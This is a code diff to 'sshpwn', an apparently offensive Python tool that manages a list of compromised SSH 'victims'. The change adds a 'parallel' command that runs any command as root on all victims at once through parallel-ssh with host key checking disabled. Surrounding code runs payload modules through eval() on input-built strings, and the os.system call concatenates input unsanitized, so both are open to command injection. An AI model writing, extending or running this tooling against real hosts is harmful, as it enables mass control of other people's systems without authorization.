@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# sshpwn v1.5
+# sshpwn v1.5.1
 
 # Copyright (c) 2016 Shawn Pang
 # http://shawnpang.com
@@ -237,6 +237,34 @@ def builtincmd(cmd, victims):
         print(cs.good, "Exported list to", params[1])
         return 2
 
+    # TODO: Parallel Command
+    elif cmd[0] == "parallel":
+        def parallelusage():
+            print(cs.status, "Usage: parallel [mode: ssh, scp] [command | file] [if scp: remote location]")
+        if len(cmd) != 2:
+            parallelusage()
+        else:
+            params = cmd[1].split(" ")
+            if len(params) < 2:
+                parallelusage()
+            elif params[0] != "ssh" and params[0] != "scp":
+                print(cs.error, "Unknown format '" + params[0] + "'")
+            else:
+                hoststring = ""
+                for victim in victims:
+                    hoststring += victim.user + "@" + victim.host + " " 
+                
+                if params[0] == "ssh":
+                    print()
+                    os.system("parallel-ssh -i -O StrictHostKeyChecking=no -H \"" + hoststring + "\" -l root -A " + params[1])
+                elif params[0] == "scp": 
+                    if len(params) < 3:
+                        print(cs.error, "Missing remote location!")
+                    else:
+                        pass
+        
+        return 2
+
 def execute(cmd, victim, configs):
     try:
         result = eval(cmd[0] + ".execute(victim, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
@@ -254,10 +282,10 @@ def execute(cmd, victim, configs):
         return 2
 
 def main():
-    print(cs.good, "Loaded payloads")
 
-    configs = dict(config.strip().split(" ") for config in open("config", "r") if config.strip())
-    print(cs.good, "Loaded config file")
+    with log.progress("Loading config file...") as p:
+        configs = dict(config.strip().split(" ") for config in open("config", "r") if config.strip())
+        p.status("")
 
     try:
         while True:
